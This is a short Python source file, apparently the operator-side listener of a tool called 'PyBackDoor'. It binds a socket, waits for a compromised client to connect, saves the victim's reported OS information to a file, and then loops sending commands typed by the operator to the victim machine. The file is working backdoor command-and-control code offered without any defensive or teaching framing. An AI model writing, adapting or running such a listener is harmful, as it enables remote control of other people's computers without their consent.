import subprocess
import os
from socket import *
def pybackdoor_listen(LHOST,LPORT):
    print('Starting connection...')
    connection = socket(AF_INET, SOCK_STREAM)
    connection.bind((LHOST, LPORT))
    connection.listen(1)
    print( 'Listening on:'+ LHOST+':'+str(LPORT)+"...\n")
    client, addr = connection.accept()
    print("connection -> " + str(addr))
    while True:
        receiver = client.recv(1024).decode()
        if '[OS INFO]' in receiver:
            with open('client_info.txt','w') as session_file:
                os_info = "PyBackDoor\n----------\nOS INFO \n "+receiver
                session_file.write(os_info)
        print(receiver)
        cmd = input(str(addr)+"-> ")
        if cmd == "exit":
            client.send(cmd.encode())
            exit()
        elif cmd == "" or cmd == None:
            cmd = "----"
            client.send(cmd.encode())
        else:
            client.send(cmd.encode())